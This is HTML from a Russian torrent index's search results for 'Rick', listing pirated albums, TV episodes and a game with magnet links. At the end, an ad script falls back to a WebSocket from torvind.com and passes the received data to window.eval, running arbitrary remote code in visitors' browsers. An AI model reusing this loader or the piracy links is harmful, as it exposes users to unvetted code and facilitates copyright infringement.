+<td align="right">123.56&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>11&nbsp;Июл&nbsp;16</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/513796"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:00681f8b173bf42b05dd65a3712077911044bb46&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/513796/rick-lori-bethe-brenckman-straight-from-the-heart-love-songs-for-the-new-age-1991-mp3-ot-mifograd">Rick &amp; Lori Bethe Brenckman - Straight from the Heart (love songs for the new age) (1991) MP3 от Мифоград </a></td>
+<td align="right">90.59&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>12&nbsp;Июн&nbsp;16</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/509032"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1d147b19dd0d992fb4cc5e70e1353244a006b248&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/509032/rick-astley-50-2016-aac-itunes">Rick Astley - 50 (2016) AAC | iTunes </a></td>
+<td align="right">90.34&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>09&nbsp;Июн&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/508660"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b1a922183db62bd97d42213c82cfee8d33303a9e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/508660/rick-astley-50-2016-flac">Rick Astley - 50 (2016) FLAC </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">295.90&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>08&nbsp;Июн&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/508478"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f168824d98f1d549bc5ed1146f1b325ce34aee41&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/508478/rik-i-morti_rick-and-morty-s02-2015-bdrip-1080p-syenduk">Рик и Морти / Rick and Morty [S02] (2015) BDRip 1080p | Сыендук </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">10.84&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;23</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>13&nbsp;Май&nbsp;16</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/503737"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:ceaa3c648af212d8f06b1fb6f642125248fd678e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/503737/rick-wakeman-special-of-2015-flac">Rick Wakeman - Special Of (2015) FLAC </a></td>
+<td align="right">1.20&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>27&nbsp;Мар&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/495434"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b1573c3a8485e92f1da8a3d143dc87485193322d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/495434/rick-astley-collection-5cd-1987-2001-ape">Rick Astley - Collection [5CD] (1987-2001) APE </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.30&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>27&nbsp;Мар&nbsp;16</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/495348"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:30f4126b91388645a8d724359dea2b3e74d772a0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/495348/rick-astley-the-best-of-2000-flac">Rick Astley - The Best Of (2000) FLAC </a></td>
+<td align="right">453.31&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>21&nbsp;Фев&nbsp;16</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/488684"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:3340bafa620545eba51500de354782d9c06101f9&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/488684/rick-springfield-rocket-science-2016-flac">Rick Springfield - Rocket Science (2016) FLAC </a></td>
+<td align="right">358.18&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>04&nbsp;Дек&nbsp;15</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/473949"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:672e4e26af93670ddfbf77f3a88b0d1e2bf64526&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/473949/rick-ross-black-market-deluxe-edition-2015-mp3">Rick Ross - Black Market [Deluxe Edition] (2015) MP3 </a></td>
+<td align="right">178.35&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>27&nbsp;Окт&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/465828"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d4b4a0041759ac58780aa6af45261da697c8095f&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/465828/rik-i-morti-_rick-and-morty-s01-02-2013-2015-web-dl-720p-syenduk">Рик и Морти  / Rick and Morty [S01-02] (2013-2015) WEB-DL 720p | Сыендук </a></td> <td align="right">7<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">11.93&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;26</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="tum"><td>09&nbsp;Окт&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/457766"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:fa7931e4992bd33c32448268e4698bf02112bf97&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/457766/rik-i-morti_rick-and-morty-s02-2015-web-dlrip-syenduk">Рик и Морти / Rick and Morty [S02] (2015) WEB-DLRip | Сыендук </a></td> <td align="right">27<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">2.64&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;9</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>09&nbsp;Окт&nbsp;15</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/457767"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:19437735a64026edceb2f1604d5f73d67f90f636&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/457767/rik-i-morti_rick-and-morty-s02-2015-web-dlrip-l2">Рик и Морти / Rick and Morty [S02] (2015) WEB-DLRip | L2 </a></td>
+<td align="right">2.64&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>11&nbsp;Июл&nbsp;15</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/443844"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a38ea64c8c20deb492b9b12b14059431d8ede05e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/443844/rick_rik-diskografija-2012-2014-mp3">Rick / Рик - Дискография (2012-2014) MP3 </a></td>
+<td align="right">365.54&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>18&nbsp;Июн&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/439032"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1a093c39ba99f37b126291212c30d08454c01115&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/439032/rik-i-morti_rick-and-morty-s01-2013-2014-bdrip-1080p-syenduk">Рик и Морти / Rick and Morty [S01] (2013-2014) BDRip 1080p | Сыендук </a></td> <td align="right">5<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">7.97&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;38</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="tum"><td>20&nbsp;Апр&nbsp;15</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/427151"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:45b036d2a6ca8d31c158d327c857ac2c521d2105&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/427151/rick-ross-the-maybach-edition-ep-2015-mp3">Rick Ross - The Maybach Edition EP (2015) MP3 </a></td>
+<td align="right">43.12&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>16&nbsp;Янв&nbsp;15</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/405118"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:820bc1a8fe51ea25ec061f159c839932c7674f12&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/405118/rick-ruskin-whatever-happened-to..-blind-matzoh-leftkowitz?-2015-mp3">Rick Ruskin - Whatever Happened To... Blind Matzoh Leftkowitz? (2015) MP3 </a></td>
+<td align="right">86.23&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>23&nbsp;Апр&nbsp;14</td><td ><a class="downgif" href="http://d.rutor.info/download/351365"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b9b363d6cb3df78643530f4e7c27b1009560789e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/351365/rick-ross-mastermind-deluxe-edition-2014-mp3">Rick Ross - Mastermind (Deluxe Edition) (2014) MP3 </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">142.66&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>11&nbsp;Мар&nbsp;14</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/341799"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b9f9e81429441d9672ea546cdf0f664513f50227&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/341799/rick-derringer-free-ride-2002-mp3-ot-bestsound-exkinoray">Rick Derringer - Free Ride (2002) MP3  от BestSound ExKinoRay </a></td>
+<td align="right">113.56&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>05&nbsp;Окт&nbsp;13</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/308280"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:567f51c737e26ca288ef104ac023c1e14396e189&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/308280/rick-ross-discography-2006-2009-mp3">Rick Ross - Discography (2006-2009) MP3 </a></td>
+<td align="right">1.82&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>27&nbsp;Авг&nbsp;13</td><td ><a class="downgif" href="http://d.rutor.info/download/301397"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:02356cd8245d1f00d5be5404cd11198c65c9d5f2&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/301397/velikij-pobeg-2003-pc-repack-ot-rick-deckard">Великий побег (2003) PC | RePack от Rick Deckard </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.00&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>29&nbsp;Мар&nbsp;13</td><td ><a class="downgif" href="http://d.rutor.info/download/267211"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:6d861eac0fe93ac077d278eaf12843d8b7e9434a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/267211/ost-trans-_trance-original-soundtrack-rick-smith-various-artists-2013-mp3">OST - Транс  / Trance [Original Soundtrack] [Rick Smith, Various Artists] (2013) MP3 </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">169.42&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>15&nbsp;Мар&nbsp;13</td><td ><a class="downgif" href="http://d.rutor.info/download/262909"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:18e79b4adac4f586064d86c5cd5c8812d075ae1a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/262909/rick-vito-ex-fleetwood-mac-in-concert-2000-2003-dvd5-ot-brazzass">Rick Vito (ex Fleetwood Mac) - In Concert 2000 (2003) DVD5 от Brazzass </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">4.36&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>16&nbsp;Окт&nbsp;11</td><td ><a class="downgif" href="http://d.rutor.info/download/146071"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d59a9e78a0a527c8d2135d34540912aa5cd67593&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/146071/rick-wakeman-kollekcija-1972-2007-mp3">Rick Wakeman - Коллекция (1972-2007) MP3 </a></td> <td align="right">5<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">3.65&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>03&nbsp;Сен&nbsp;11</td><td ><a class="downgif" href="http://d.rutor.info/download/136789"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:baa4fbb66a91af44bf84412203ca0695ae523b2e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/136789/rick-springfield-diskografija-ctudijnye-albomy-1980-2009-mp3">Rick Springfield  - Дискография [cтудийные альбомы] (1980 - 2009) MP3 </a></td> <td align="right">7<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.21&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>17&nbsp;Авг&nbsp;11</td><td ><a class="downgif" href="http://d.rutor.info/download/132563"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:37ec42dbecd189ffc374821bdc3d754f8644a527&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/132563/rick-astley-diskografija-ctudijnye-albomy-1987-2005-mp3">Rick Astley - Дискография [cтудийные альбомы] (1987-2005) MP3 </a></td> <td align="right">5<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.39&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>30&nbsp;Сен&nbsp;10</td><td ><a class="downgif" href="http://d.rutor.info/download/68918"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:93f9969f6c0af4f23a65e5a0fddb43248c1bba13&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/68918/rick-wakeman-the-six-wives-of-henry-viii-live-at-hampton-court-palace-2009-dvdrip-ot-zona-x">Rick Wakeman - The Six Wives of Henry VIII (Live at Hampton Court Palace) (2009) DVDRip от Zona-X </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.61&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><b>Страницы:  1</b></div>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>.
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='https://mrelko.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+
+<script>(function(){var s=document.createElement('script');s.src='https://mrelko.com/j/w.php?id=2357&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+
+
+</body>
+</html>
